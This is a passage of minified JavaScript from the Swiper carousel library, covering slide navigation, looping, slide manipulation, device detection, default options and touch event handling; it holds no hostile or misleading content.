            (e = n ? this.$wrapperEl.find("." + i.slideClass + '[data-swiper-slide-index="' + a + '"]') : t.eq(a)).addClass(i.slideActiveClass),
            i.loop && (e.hasClass(i.slideDuplicateClass) ? s.children("." + i.slideClass + ":not(." + i.slideDuplicateClass + ')[data-swiper-slide-index="' + r + '"]').addClass(i.slideDuplicateActiveClass) : s.children("." + i.slideClass + "." + i.slideDuplicateClass + '[data-swiper-slide-index="' + r + '"]').addClass(i.slideDuplicateActiveClass));
            var o = e.nextAll("." + i.slideClass).eq(0).addClass(i.slideNextClass);
            i.loop && 0 === o.length && (o = t.eq(0)).addClass(i.slideNextClass);
            var l = e.prevAll("." + i.slideClass).eq(0).addClass(i.slidePrevClass);
            i.loop && 0 === l.length && (l = t.eq(-1)).addClass(i.slidePrevClass),
            i.loop && (o.hasClass(i.slideDuplicateClass) ? s.children("." + i.slideClass + ":not(." + i.slideDuplicateClass + ')[data-swiper-slide-index="' + o.attr("data-swiper-slide-index") + '"]').addClass(i.slideDuplicateNextClass) : s.children("." + i.slideClass + "." + i.slideDuplicateClass + '[data-swiper-slide-index="' + o.attr("data-swiper-slide-index") + '"]').addClass(i.slideDuplicateNextClass),
            l.hasClass(i.slideDuplicateClass) ? s.children("." + i.slideClass + ":not(." + i.slideDuplicateClass + ')[data-swiper-slide-index="' + l.attr("data-swiper-slide-index") + '"]').addClass(i.slideDuplicatePrevClass) : s.children("." + i.slideClass + "." + i.slideDuplicateClass + '[data-swiper-slide-index="' + l.attr("data-swiper-slide-index") + '"]').addClass(i.slideDuplicatePrevClass))
        },
        updateActiveIndex: function(e) {
            var t, i = this.rtlTranslate ? this.translate : -this.translate, s = this.slidesGrid, a = this.snapGrid, r = this.params, n = this.activeIndex, o = this.realIndex, d = this.snapIndex, h = e;
            if (void 0 === h) {
                for (var p = 0; p < s.length; p += 1)
                    void 0 !== s[p + 1] ? i >= s[p] && i < s[p + 1] - (s[p + 1] - s[p]) / 2 ? h = p : i >= s[p] && i < s[p + 1] && (h = p + 1) : i >= s[p] && (h = p);
                r.normalizeSlideIndex && (h < 0 || void 0 === h) && (h = 0)
            }
            if ((t = a.indexOf(i) >= 0 ? a.indexOf(i) : Math.floor(h / r.slidesPerGroup)) >= a.length && (t = a.length - 1),
            h !== n) {
                var c = parseInt(this.slides.eq(h).attr("data-swiper-slide-index") || h, 10);
                l.extend(this, {
                    snapIndex: t,
                    realIndex: c,
                    previousIndex: n,
                    activeIndex: h
                }),
                this.emit("activeIndexChange"),
                this.emit("snapIndexChange"),
                o !== c && this.emit("realIndexChange"),
                (this.initialized || this.runCallbacksOnInit) && this.emit("slideChange")
            } else
                t !== d && (this.snapIndex = t,
                this.emit("snapIndexChange"))
        },
        updateClickedSlide: function(e) {
            var t = this.params
              , i = s(e.target).closest("." + t.slideClass)[0]
              , a = !1;
            if (i)
                for (var r = 0; r < this.slides.length; r += 1)
                    this.slides[r] === i && (a = !0);
            if (!i || !a)
                return this.clickedSlide = void 0,
                void (this.clickedIndex = void 0);
            this.clickedSlide = i,
            this.virtual && this.params.virtual.enabled ? this.clickedIndex = parseInt(s(i).attr("data-swiper-slide-index"), 10) : this.clickedIndex = s(i).index(),
            t.slideToClickedSlide && void 0 !== this.clickedIndex && this.clickedIndex !== this.activeIndex && this.slideToClickedSlide()
        }
    };
    var v = {
        getTranslate: function(e) {
            void 0 === e && (e = this.isHorizontal() ? "x" : "y");
            var t = this.params
              , i = this.rtlTranslate
              , s = this.translate
              , a = this.$wrapperEl;
            if (t.virtualTranslate)
                return i ? -s : s;
            var r = l.getTranslate(a[0], e);
            return i && (r = -r),
            r || 0
        },
        setTranslate: function(e, t) {
            var i = this.rtlTranslate
              , s = this.params
              , a = this.$wrapperEl
              , r = this.progress
              , n = 0
              , o = 0;
            this.isHorizontal() ? n = i ? -e : e : o = e,
            s.roundLengths && (n = Math.floor(n),
            o = Math.floor(o)),
            s.virtualTranslate || (d.transforms3d ? a.transform("translate3d(" + n + "px, " + o + "px, 0px)") : a.transform("translate(" + n + "px, " + o + "px)")),
            this.previousTranslate = this.translate,
            this.translate = this.isHorizontal() ? n : o;
            var l = this.maxTranslate() - this.minTranslate();
            (0 === l ? 0 : (e - this.minTranslate()) / l) !== r && this.updateProgress(e),
            this.emit("setTranslate", this.translate, t)
        },
        minTranslate: function() {
            return -this.snapGrid[0]
        },
        maxTranslate: function() {
            return -this.snapGrid[this.snapGrid.length - 1]
        }
    };
    var f = {
        setTransition: function(e, t) {
            this.$wrapperEl.transition(e),
            this.emit("setTransition", e, t)
        },
        transitionStart: function(e, t) {
            void 0 === e && (e = !0);
            var i = this.activeIndex
              , s = this.params
              , a = this.previousIndex;
            s.autoHeight && this.updateAutoHeight();
            var r = t;
            if (r || (r = i > a ? "next" : i < a ? "prev" : "reset"),
            this.emit("transitionStart"),
            e && i !== a) {
                if ("reset" === r)
                    return void this.emit("slideResetTransitionStart");
                this.emit("slideChangeTransitionStart"),
                "next" === r ? this.emit("slideNextTransitionStart") : this.emit("slidePrevTransitionStart")
            }
        },
        transitionEnd: function(e, t) {
            void 0 === e && (e = !0);
            var i = this.activeIndex
              , s = this.previousIndex;
            this.animating = !1,
            this.setTransition(0);
            var a = t;
            if (a || (a = i > s ? "next" : i < s ? "prev" : "reset"),
            this.emit("transitionEnd"),
            e && i !== s) {
                if ("reset" === a)
                    return void this.emit("slideResetTransitionEnd");
                this.emit("slideChangeTransitionEnd"),
                "next" === a ? this.emit("slideNextTransitionEnd") : this.emit("slidePrevTransitionEnd")
            }
        }
    };
    var m = {
        slideTo: function(e, t, i, s) {
            void 0 === e && (e = 0),
            void 0 === t && (t = this.params.speed),
            void 0 === i && (i = !0);
            var a = this
              , r = e;
            r < 0 && (r = 0);
            var n = a.params
              , o = a.snapGrid
              , l = a.slidesGrid
              , h = a.previousIndex
              , p = a.activeIndex
              , c = a.rtlTranslate;
            if (a.animating && n.preventInteractionOnTransition)
                return !1;
            var u = Math.floor(r / n.slidesPerGroup);
            u >= o.length && (u = o.length - 1),
            (p || n.initialSlide || 0) === (h || 0) && i && a.emit("beforeSlideChangeStart");
            var v, f = -o[u];
            if (a.updateProgress(f),
            n.normalizeSlideIndex)
                for (var m = 0; m < l.length; m += 1)
                    -Math.floor(100 * f) >= Math.floor(100 * l[m]) && (r = m);
            if (a.initialized && r !== p) {
                if (!a.allowSlideNext && f < a.translate && f < a.minTranslate())
                    return !1;
                if (!a.allowSlidePrev && f > a.translate && f > a.maxTranslate() && (p || 0) !== r)
                    return !1
            }
            return v = r > p ? "next" : r < p ? "prev" : "reset",
            c && -f === a.translate || !c && f === a.translate ? (a.updateActiveIndex(r),
            n.autoHeight && a.updateAutoHeight(),
            a.updateSlidesClasses(),
            "slide" !== n.effect && a.setTranslate(f),
            "reset" !== v && (a.transitionStart(i, v),
            a.transitionEnd(i, v)),
            !1) : (0 !== t && d.transition ? (a.setTransition(t),
            a.setTranslate(f),
            a.updateActiveIndex(r),
            a.updateSlidesClasses(),
            a.emit("beforeTransitionStart", t, s),
            a.transitionStart(i, v),
            a.animating || (a.animating = !0,
            a.onSlideToWrapperTransitionEnd || (a.onSlideToWrapperTransitionEnd = function(e) {
                a && !a.destroyed && e.target === this && (a.$wrapperEl[0].removeEventListener("transitionend", a.onSlideToWrapperTransitionEnd),
                a.$wrapperEl[0].removeEventListener("webkitTransitionEnd", a.onSlideToWrapperTransitionEnd),
                a.onSlideToWrapperTransitionEnd = null,
                delete a.onSlideToWrapperTransitionEnd,
                a.transitionEnd(i, v))
            }
            ),
            a.$wrapperEl[0].addEventListener("transitionend", a.onSlideToWrapperTransitionEnd),
            a.$wrapperEl[0].addEventListener("webkitTransitionEnd", a.onSlideToWrapperTransitionEnd))) : (a.setTransition(0),
            a.setTranslate(f),
            a.updateActiveIndex(r),
            a.updateSlidesClasses(),
            a.emit("beforeTransitionStart", t, s),
            a.transitionStart(i, v),
            a.transitionEnd(i, v)),
            !0)
        },
        slideToLoop: function(e, t, i, s) {
            void 0 === e && (e = 0),
            void 0 === t && (t = this.params.speed),
            void 0 === i && (i = !0);
            var a = e;
            return this.params.loop && (a += this.loopedSlides),
            this.slideTo(a, t, i, s)
        },
        slideNext: function(e, t, i) {
            void 0 === e && (e = this.params.speed),
            void 0 === t && (t = !0);
            var s = this.params
              , a = this.animating;
            return s.loop ? !a && (this.loopFix(),
            this._clientLeft = this.$wrapperEl[0].clientLeft,
            this.slideTo(this.activeIndex + s.slidesPerGroup, e, t, i)) : this.slideTo(this.activeIndex + s.slidesPerGroup, e, t, i)
        },
        slidePrev: function(e, t, i) {
            void 0 === e && (e = this.params.speed),
            void 0 === t && (t = !0);
            var s = this.params
              , a = this.animating
              , r = this.snapGrid
              , n = this.slidesGrid
              , o = this.rtlTranslate;
            if (s.loop) {
                if (a)
                    return !1;
                this.loopFix(),
                this._clientLeft = this.$wrapperEl[0].clientLeft
            }
            function l(e) {
                return e < 0 ? -Math.floor(Math.abs(e)) : Math.floor(e)
            }
            var d, h = l(o ? this.translate : -this.translate), p = r.map(function(e) {
                return l(e)
            }), c = (n.map(function(e) {
                return l(e)
            }),
            r[p.indexOf(h)],
            r[p.indexOf(h) - 1]);
            return void 0 !== c && (d = n.indexOf(c)) < 0 && (d = this.activeIndex - 1),
            this.slideTo(d, e, t, i)
        },
        slideReset: function(e, t, i) {
            return void 0 === e && (e = this.params.speed),
            void 0 === t && (t = !0),
            this.slideTo(this.activeIndex, e, t, i)
        },
        slideToClosest: function(e, t, i) {
            void 0 === e && (e = this.params.speed),
            void 0 === t && (t = !0);
            var s = this.activeIndex
              , a = Math.floor(s / this.params.slidesPerGroup);
            if (a < this.snapGrid.length - 1) {
                var r = this.rtlTranslate ? this.translate : -this.translate
                  , n = this.snapGrid[a];
                r - n > (this.snapGrid[a + 1] - n) / 2 && (s = this.params.slidesPerGroup)
            }
            return this.slideTo(s, e, t, i)
        },
        slideToClickedSlide: function() {
            var e, t = this, i = t.params, a = t.$wrapperEl, r = "auto" === i.slidesPerView ? t.slidesPerViewDynamic() : i.slidesPerView, n = t.clickedIndex;
            if (i.loop) {
                if (t.animating)
                    return;
                e = parseInt(s(t.clickedSlide).attr("data-swiper-slide-index"), 10),
                i.centeredSlides ? n < t.loopedSlides - r / 2 || n > t.slides.length - t.loopedSlides + r / 2 ? (t.loopFix(),
                n = a.children("." + i.slideClass + '[data-swiper-slide-index="' + e + '"]:not(.' + i.slideDuplicateClass + ")").eq(0).index(),
                l.nextTick(function() {
                    t.slideTo(n)
                })) : t.slideTo(n) : n > t.slides.length - r ? (t.loopFix(),
                n = a.children("." + i.slideClass + '[data-swiper-slide-index="' + e + '"]:not(.' + i.slideDuplicateClass + ")").eq(0).index(),
                l.nextTick(function() {
                    t.slideTo(n)
                })) : t.slideTo(n)
            } else
                t.slideTo(n)
        }
    };
    var g = {
        loopCreate: function() {
            var t = this
              , i = t.params
              , a = t.$wrapperEl;
            a.children("." + i.slideClass + "." + i.slideDuplicateClass).remove();
            var r = a.children("." + i.slideClass);
            if (i.loopFillGroupWithBlank) {
                var n = i.slidesPerGroup - r.length % i.slidesPerGroup;
                if (n !== i.slidesPerGroup) {
                    for (var o = 0; o < n; o += 1) {
                        var l = s(e.createElement("div")).addClass(i.slideClass + " " + i.slideBlankClass);
                        a.append(l)
                    }
                    r = a.children("." + i.slideClass)
                }
            }
            "auto" !== i.slidesPerView || i.loopedSlides || (i.loopedSlides = r.length),
            t.loopedSlides = parseInt(i.loopedSlides || i.slidesPerView, 10),
            t.loopedSlides += i.loopAdditionalSlides,
            t.loopedSlides > r.length && (t.loopedSlides = r.length);
            var d = []
              , h = [];
            r.each(function(e, i) {
                var a = s(i);
                e < t.loopedSlides && h.push(i),
                e < r.length && e >= r.length - t.loopedSlides && d.push(i),
                a.attr("data-swiper-slide-index", e)
            });
            for (var p = 0; p < h.length; p += 1)
                a.append(s(h[p].cloneNode(!0)).addClass(i.slideDuplicateClass));
            for (var c = d.length - 1; c >= 0; c -= 1)
                a.prepend(s(d[c].cloneNode(!0)).addClass(i.slideDuplicateClass))
        },
        loopFix: function() {
            var e, t = this.params, i = this.activeIndex, s = this.slides, a = this.loopedSlides, r = this.allowSlidePrev, n = this.allowSlideNext, o = this.snapGrid, l = this.rtlTranslate;
            this.allowSlidePrev = !0,
            this.allowSlideNext = !0;
            var d = -o[i] - this.getTranslate();
            i < a ? (e = s.length - 3 * a + i,
            e += a,
            this.slideTo(e, 0, !1, !0) && 0 !== d && this.setTranslate((l ? -this.translate : this.translate) - d)) : ("auto" === t.slidesPerView && i >= 2 * a || i >= s.length - a) && (e = -s.length + i + a,
            e += a,
            this.slideTo(e, 0, !1, !0) && 0 !== d && this.setTranslate((l ? -this.translate : this.translate) - d));
            this.allowSlidePrev = r,
            this.allowSlideNext = n
        },
        loopDestroy: function() {
            var e = this.$wrapperEl
              , t = this.params
              , i = this.slides;
            e.children("." + t.slideClass + "." + t.slideDuplicateClass + ",." + t.slideClass + "." + t.slideBlankClass).remove(),
            i.removeAttr("data-swiper-slide-index")
        }
    };
    var b = {
        setGrabCursor: function(e) {
            if (!(d.touch || !this.params.simulateTouch || this.params.watchOverflow && this.isLocked)) {
                var t = this.el;
                t.style.cursor = "move",
                t.style.cursor = e ? "-webkit-grabbing" : "-webkit-grab",
                t.style.cursor = e ? "-moz-grabbin" : "-moz-grab",
                t.style.cursor = e ? "grabbing" : "grab"
            }
        },
        unsetGrabCursor: function() {
            d.touch || this.params.watchOverflow && this.isLocked || (this.el.style.cursor = "")
        }
    };
    var w = {
        appendSlide: function(e) {
            var t = this.$wrapperEl
              , i = this.params;
            if (i.loop && this.loopDestroy(),
            "object" == typeof e && "length"in e)
                for (var s = 0; s < e.length; s += 1)
                    e[s] && t.append(e[s]);
            else
                t.append(e);
            i.loop && this.loopCreate(),
            i.observer && d.observer || this.update()
        },
        prependSlide: function(e) {
            var t = this.params
              , i = this.$wrapperEl
              , s = this.activeIndex;
            t.loop && this.loopDestroy();
            var a = s + 1;
            if ("object" == typeof e && "length"in e) {
                for (var r = 0; r < e.length; r += 1)
                    e[r] && i.prepend(e[r]);
                a = s + e.length
            } else
                i.prepend(e);
            t.loop && this.loopCreate(),
            t.observer && d.observer || this.update(),
            this.slideTo(a, 0, !1)
        },
        addSlide: function(e, t) {
            var i = this.$wrapperEl
              , s = this.params
              , a = this.activeIndex;
            s.loop && (a -= this.loopedSlides,
            this.loopDestroy(),
            this.slides = i.children("." + s.slideClass));
            var r = this.slides.length;
            if (e <= 0)
                this.prependSlide(t);
            else if (e >= r)
                this.appendSlide(t);
            else {
                for (var n = a > e ? a + 1 : a, o = [], l = r - 1; l >= e; l -= 1) {
                    var h = this.slides.eq(l);
                    h.remove(),
                    o.unshift(h)
                }
                if ("object" == typeof t && "length"in t) {
                    for (var p = 0; p < t.length; p += 1)
                        t[p] && i.append(t[p]);
                    n = a > e ? a + t.length : a
                } else
                    i.append(t);
                for (var c = 0; c < o.length; c += 1)
                    i.append(o[c]);
                s.loop && this.loopCreate(),
                s.observer && d.observer || this.update(),
                s.loop ? this.slideTo(n + this.loopedSlides, 0, !1) : this.slideTo(n, 0, !1)
            }
        },
        removeSlide: function(e) {
            var t = this.params
              , i = this.$wrapperEl
              , s = this.activeIndex;
            t.loop && (s -= this.loopedSlides,
            this.loopDestroy(),
            this.slides = i.children("." + t.slideClass));
            var a, r = s;
            if ("object" == typeof e && "length"in e) {
                for (var n = 0; n < e.length; n += 1)
                    a = e[n],
                    this.slides[a] && this.slides.eq(a).remove(),
                    a < r && (r -= 1);
                r = Math.max(r, 0)
            } else
                a = e,
                this.slides[a] && this.slides.eq(a).remove(),
                a < r && (r -= 1),
                r = Math.max(r, 0);
            t.loop && this.loopCreate(),
            t.observer && d.observer || this.update(),
            t.loop ? this.slideTo(r + this.loopedSlides, 0, !1) : this.slideTo(r, 0, !1)
        },
        removeAllSlides: function() {
            for (var e = [], t = 0; t < this.slides.length; t += 1)
                e.push(t);
            this.removeSlide(e)
        }
    }
      , y = function() {
        var i = t.navigator.userAgent
          , s = {
            ios: !1,
            android: !1,
            androidChrome: !1,
            desktop: !1,
            windows: !1,
            iphone: !1,
            ipod: !1,
            ipad: !1,
            cordova: t.cordova || t.phonegap,
            phonegap: t.cordova || t.phonegap
        }
          , a = i.match(/(Windows Phone);?[\s\/]+([\d.]+)?/)
          , r = i.match(/(Android);?[\s\/]+([\d.]+)?/)
          , n = i.match(/(iPad).*OS\s([\d_]+)/)
          , o = i.match(/(iPod)(.*OS\s([\d_]+))?/)
          , l = !n && i.match(/(iPhone\sOS|iOS)\s([\d_]+)/);
        if (a && (s.os = "windows",
        s.osVersion = a[2],
        s.windows = !0),
        r && !a && (s.os = "android",
        s.osVersion = r[2],
        s.android = !0,
        s.androidChrome = i.toLowerCase().indexOf("chrome") >= 0),
        (n || l || o) && (s.os = "ios",
        s.ios = !0),
        l && !o && (s.osVersion = l[2].replace(/_/g, "."),
        s.iphone = !0),
        n && (s.osVersion = n[2].replace(/_/g, "."),
        s.ipad = !0),
        o && (s.osVersion = o[3] ? o[3].replace(/_/g, ".") : null,
        s.iphone = !0),
        s.ios && s.osVersion && i.indexOf("Version/") >= 0 && "10" === s.osVersion.split(".")[0] && (s.osVersion = i.toLowerCase().split("version/")[1].split(" ")[0]),
        s.desktop = !(s.os || s.android || s.webView),
        s.webView = (l || n || o) && i.match(/.*AppleWebKit(?!.*Safari)/i),
        s.os && "ios" === s.os) {
            var d = s.osVersion.split(".")
              , h = e.querySelector('meta[name="viewport"]');
            s.minimalUi = !s.webView && (o || l) && (1 * d[0] == 7 ? 1 * d[1] >= 1 : 1 * d[0] > 7) && h && h.getAttribute("content").indexOf("minimal-ui") >= 0
        }
        return s.pixelRatio = t.devicePixelRatio || 1,
        s
    }();
    function x() {
        var e = this.params
          , t = this.el;
        if (!t || 0 !== t.offsetWidth) {
            e.breakpoints && this.setBreakpoint();
            var i = this.allowSlideNext
              , s = this.allowSlidePrev
              , a = this.snapGrid;
            if (this.allowSlideNext = !0,
            this.allowSlidePrev = !0,
            this.updateSize(),
            this.updateSlides(),
            e.freeMode) {
                var r = Math.min(Math.max(this.translate, this.maxTranslate()), this.minTranslate());
                this.setTranslate(r),
                this.updateActiveIndex(),
                this.updateSlidesClasses(),
                e.autoHeight && this.updateAutoHeight()
            } else
                this.updateSlidesClasses(),
                ("auto" === e.slidesPerView || e.slidesPerView > 1) && this.isEnd && !this.params.centeredSlides ? this.slideTo(this.slides.length - 1, 0, !1, !0) : this.slideTo(this.activeIndex, 0, !1, !0);
            this.autoplay && this.autoplay.running && this.autoplay.paused && this.autoplay.run(),
            this.allowSlidePrev = s,
            this.allowSlideNext = i,
            this.params.watchOverflow && a !== this.snapGrid && this.checkOverflow()
        }
    }
    var T = {
        init: !0,
        direction: "horizontal",
        touchEventsTarget: "container",
        initialSlide: 0,
        speed: 300,
        preventInteractionOnTransition: !1,
        edgeSwipeDetection: !1,
        edgeSwipeThreshold: 20,
        freeMode: !1,
        freeModeMomentum: !0,
        freeModeMomentumRatio: 1,
        freeModeMomentumBounce: !0,
        freeModeMomentumBounceRatio: 1,
        freeModeMomentumVelocityRatio: 1,
        freeModeSticky: !1,
        freeModeMinimumVelocity: .02,
        autoHeight: !1,
        setWrapperSize: !1,
        virtualTranslate: !1,
        effect: "slide",
        breakpoints: void 0,
        breakpointsInverse: !1,
        spaceBetween: 0,
        slidesPerView: 1,
        slidesPerColumn: 1,
        slidesPerColumnFill: "column",
        slidesPerGroup: 1,
        centeredSlides: !1,
        slidesOffsetBefore: 0,
        slidesOffsetAfter: 0,
        normalizeSlideIndex: !0,
        centerInsufficientSlides: !1,
        watchOverflow: !1,
        roundLengths: !1,
        touchRatio: 1,
        touchAngle: 45,
        simulateTouch: !0,
        shortSwipes: !0,
        longSwipes: !0,
        longSwipesRatio: .5,
        longSwipesMs: 300,
        followFinger: !0,
        allowTouchMove: !0,
        threshold: 0,
        touchMoveStopPropagation: !0,
        touchStartPreventDefault: !0,
        touchStartForcePreventDefault: !1,
        touchReleaseOnEdges: !1,
        uniqueNavElements: !0,
        resistance: !0,
        resistanceRatio: .85,
        watchSlidesProgress: !1,
        watchSlidesVisibility: !1,
        grabCursor: !1,
        preventClicks: !0,
        preventClicksPropagation: !0,
        slideToClickedSlide: !1,
        preloadImages: !0,
        updateOnImagesReady: !0,
        loop: !1,
        loopAdditionalSlides: 0,
        loopedSlides: null,
        loopFillGroupWithBlank: !1,
        allowSlidePrev: !0,
        allowSlideNext: !0,
        swipeHandler: null,
        noSwiping: !0,
        noSwipingClass: "swiper-no-swiping",
        noSwipingSelector: null,
        passiveListeners: !0,
        containerModifierClass: "swiper-container-",
        slideClass: "swiper-slide",
        slideBlankClass: "swiper-slide-invisible-blank",
        slideActiveClass: "swiper-slide-active",
        slideDuplicateActiveClass: "swiper-slide-duplicate-active",
        slideVisibleClass: "swiper-slide-visible",
        slideDuplicateClass: "swiper-slide-duplicate",
        slideNextClass: "swiper-slide-next",
        slideDuplicateNextClass: "swiper-slide-duplicate-next",
        slidePrevClass: "swiper-slide-prev",
        slideDuplicatePrevClass: "swiper-slide-duplicate-prev",
        wrapperClass: "swiper-wrapper",
        runCallbacksOnInit: !0
    }
      , E = {
        update: u,
        translate: v,
        transition: f,
        slide: m,
        loop: g,
        grabCursor: b,
        manipulation: w,
        events: {
            attachEvents: function() {
                var i = this.params
                  , a = this.touchEvents
                  , r = this.el
                  , n = this.wrapperEl;
                this.onTouchStart = function(i) {
                    var a = this.touchEventsData
                      , r = this.params
                      , n = this.touches;
                    if (!this.animating || !r.preventInteractionOnTransition) {
                        var o = i;
                        if (o.originalEvent && (o = o.originalEvent),
                        a.isTouchEvent = "touchstart" === o.type,
                        (a.isTouchEvent || !("which"in o) || 3 !== o.which) && !(!a.isTouchEvent && "button"in o && o.button > 0 || a.isTouched && a.isMoved))
                            if (r.noSwiping && s(o.target).closest(r.noSwipingSelector ? r.noSwipingSelector : "." + r.noSwipingClass)[0])
                                this.allowClick = !0;
                            else if (!r.swipeHandler || s(o).closest(r.swipeHandler)[0]) {
                                n.currentX = "touchstart" === o.type ? o.targetTouches[0].pageX : o.pageX,
                                n.currentY = "touchstart" === o.type ? o.targetTouches[0].pageY : o.pageY;
                                var d = n.currentX
                                  , h = n.currentY
                                  , p = r.edgeSwipeDetection || r.iOSEdgeSwipeDetection
                                  , c = r.edgeSwipeThreshold || r.iOSEdgeSwipeThreshold;
                                if (!p || !(d <= c || d >= t.screen.width - c)) {
                                    if (l.extend(a, {
                                        isTouched: !0,
                                        isMoved: !1,
                                        allowTouchCallbacks: !0,
                                        isScrolling: void 0,
                                        startMoving: void 0
                                    }),
                                    n.startX = d,
                                    n.startY = h,
                                    a.touchStartTime = l.now(),
                                    this.allowClick = !0,
                                    this.updateSize(),
                                    this.swipeDirection = void 0,
                                    r.threshold > 0 && (a.allowThresholdMove = !1),
                                    "touchstart" !== o.type) {
                                        var u = !0;
                                        s(o.target).is(a.formElements) && (u = !1),
                                        e.activeElement && s(e.activeElement).is(a.formElements) && e.activeElement !== o.target && e.activeElement.blur();
                                        var v = u && this.allowTouchMove && r.touchStartPreventDefault;
                                        (r.touchStartForcePreventDefault || v) && o.preventDefault()
                                    }
                                    this.emit("touchStart", o)
                                }
                            }
                    }
                }
                .bind(this),
                this.onTouchMove = function(t) {
                    var i = this.touchEventsData
                      , a = this.params
                      , r = this.touches
                      , n = this.rtlTranslate
                      , o = t;
                    if (o.originalEvent && (o = o.originalEvent),
                    i.isTouched) {
                        if (!i.isTouchEvent || "mousemove" !== o.type) {
                            var d = "touchmove" === o.type ? o.targetTouches[0].pageX : o.pageX
                              , h = "touchmove" === o.type ? o.targetTouches[0].pageY : o.pageY;
                            if (o.preventedByNestedSwiper)
                                return r.startX = d,
                                void (r.startY = h);
                            if (!this.allowTouchMove)
                                return this.allowClick = !1,
                                void (i.isTouched && (l.extend(r, {
                                    startX: d,
                                    startY: h,
                                    currentX: d,
                                    currentY: h
                                }),
                                i.touchStartTime = l.now()));
                            if (i.isTouchEvent && a.touchReleaseOnEdges && !a.loop)
                                if (this.isVertical()) {
                                    if (h < r.startY && this.translate <= this.maxTranslate() || h > r.startY && this.translate >= this.minTranslate())
                                        return i.isTouched = !1,
                                        void (i.isMoved = !1)
                                } else if (d < r.startX && this.translate <= this.maxTranslate() || d > r.startX && this.translate >= this.minTranslate())
                                    return;
                            if (i.isTouchEvent && e.activeElement && o.target === e.activeElement && s(o.target).is(i.formElements))
                                return i.isMoved = !0,
                                void (this.allowClick = !1);
                            if (i.allowTouchCallbacks && this.emit("touchMove", o),
                            !(o.targetTouches && o.targetTouches.length > 1)) {
                                r.currentX = d,
                                r.currentY = h;
                                var p, c = r.currentX - r.startX, u = r.currentY - r.startY;
                                if (!(this.params.threshold && Math.sqrt(Math.pow(c, 2) + Math.pow(u, 2)) < this.params.threshold))
                                    if (void 0 === i.isScrolling && (this.isHorizontal() && r.currentY === r.startY || this.isVertical() && r.currentX === r.startX ? i.isScrolling = !1 : c * c + u * u >= 25 && (p = 180 * Math.atan2(Math.abs(u), Math.abs(c)) / Math.PI,
                                    i.isScrolling = this.isHorizontal() ? p > a.touchAngle : 90 - p > a.touchAngle)),
                                    i.isScrolling && this.emit("touchMoveOpposite", o),
                                    void 0 === i.startMoving && (r.currentX === r.startX && r.currentY === r.startY || (i.startMoving = !0)),
                                    i.isScrolling)
                                        i.isTouched = !1;
                                    else if (i.startMoving) {
                                        this.allowClick = !1,
                                        o.preventDefault(),
                                        a.touchMoveStopPropagation && !a.nested && o.stopPropagation(),
                                        i.isMoved || (a.loop && this.loopFix(),
                                        i.startTranslate = this.getTranslate(),
                                        this.setTransition(0),
                                        this.animating && this.$wrapperEl.trigger("webkitTransitionEnd transitionend"),
                                        i.allowMomentumBounce = !1,
                                        !a.grabCursor || !0 !== this.allowSlideNext && !0 !== this.allowSlidePrev || this.setGrabCursor(!0),
                                        this.emit("sliderFirstMove", o)),
                                        this.emit("sliderMove", o),
                                        i.isMoved = !0;
                                        var v = this.isHorizontal() ? c : u;
                                        r.diff = v,
                                        v *= a.touchRatio,
                                        n && (v = -v),
                                        this.swipeDirection = v > 0 ? "prev" : "next",
                                        i.currentTranslate = v + i.startTranslate;
                                        var f = !0
                                          , m = a.resistanceRatio;
                                        if (a.touchReleaseOnEdges && (m = 0),
                                        v > 0 && i.currentTranslate > this.minTranslate() ? (f = !1,
                                        a.resistance && (i.currentTranslate = this.minTranslate() - 1 + Math.pow(-this.minTranslate() + i.startTranslate + v, m))) : v < 0 && i.currentTranslate < this.maxTranslate() && (f = !1,
                                        a.resistance && (i.currentTranslate = this.maxTranslate() + 1 - Math.pow(this.maxTranslate() - i.startTranslate - v, m))),
                                        f && (o.preventedByNestedSwiper = !0),
                                        !this.allowSlideNext && "next" === this.swipeDirection && i.currentTranslate < i.startTranslate && (i.currentTranslate = i.startTranslate),
                                        !this.allowSlidePrev && "prev" === this.swipeDirection && i.currentTranslate > i.startTranslate && (i.currentTranslate = i.startTranslate),
                                        a.threshold > 0) {
                                            if (!(Math.abs(v) > a.threshold || i.allowThresholdMove))
                                                return void (i.currentTranslate = i.startTranslate);
                                            if (!i.allowThresholdMove)
                                                return i.allowThresholdMove = !0,
                                                r.startX = r.currentX,
                                                r.startY = r.currentY,
                                                i.currentTranslate = i.startTranslate,
                                                void (r.diff = this.isHorizontal() ? r.currentX - r.startX : r.currentY - r.startY)
                                        }
                                        a.followFinger && ((a.freeMode || a.watchSlidesProgress || a.watchSlidesVisibility) && (this.updateActiveIndex(),
                                        this.updateSlidesClasses()),
                                        a.freeMode && (0 === i.velocities.length && i.velocities.push({
                                            position: r[this.isHorizontal() ? "startX" : "startY"],
                                            time: i.touchStartTime
                                        }),
                                        i.velocities.push({
                                            position: r[this.isHorizontal() ? "currentX" : "currentY"],
                                            time: l.now()
                                        })),
                                        this.updateProgress(i.currentTranslate),
                                        this.setTranslate(i.currentTranslate))
                                    }
                            }
                        }
                    } else
                        i.startMoving && i.isScrolling && this.emit("touchMoveOpposite", o)
                }
                .bind(this),
                this.onTouchEnd = function(e) {
                    var t = this
                      , i = t.touchEventsData
                      , s = t.params
                      , a = t.touches
                      , r = t.rtlTranslate
                      , n = t.$wrapperEl
                      , o = t.slidesGrid
                      , d = t.snapGrid
                      , h = e;
                    if (h.originalEvent && (h = h.originalEvent),
                    i.allowTouchCallbacks && t.emit("touchEnd", h),
                    i.allowTouchCallbacks = !1,
                    !i.isTouched)
                        return i.isMoved && s.grabCursor && t.setGrabCursor(!1),
                        i.isMoved = !1,
                        void (i.startMoving = !1);
                    s.grabCursor && i.isMoved && i.isTouched && (!0 === t.allowSlideNext || !0 === t.allowSlidePrev) && t.setGrabCursor(!1);
                    var p, c = l.now(), u = c - i.touchStartTime;
                    if (t.allowClick && (t.updateClickedSlide(h),
                    t.emit("tap", h),
                    u < 300 && c - i.lastClickTime > 300 && (i.clickTimeout && clearTimeout(i.clickTimeout),
                    i.clickTimeout = l.nextTick(function() {
                        t && !t.destroyed && t.emit("click", h)
                    }, 300)),
                    u < 300 && c - i.lastClickTime < 300 && (i.clickTimeout && clearTimeout(i.clickTimeout),
                    t.emit("doubleTap", h))),
                    i.lastClickTime = l.now(),
                    l.nextTick(function() {
                        t.destroyed || (t.allowClick = !0)
                    }),
                    !i.isTouched || !i.isMoved || !t.swipeDirection || 0 === a.diff || i.currentTranslate === i.startTranslate)
                        return i.isTouched = !1,
                        i.isMoved = !1,
                        void (i.startMoving = !1);
                    if (i.isTouched = !1,
                    i.isMoved = !1,
                    i.startMoving = !1,
                    p = s.followFinger ? r ? t.translate : -t.translate : -i.currentTranslate,
                    s.freeMode) {
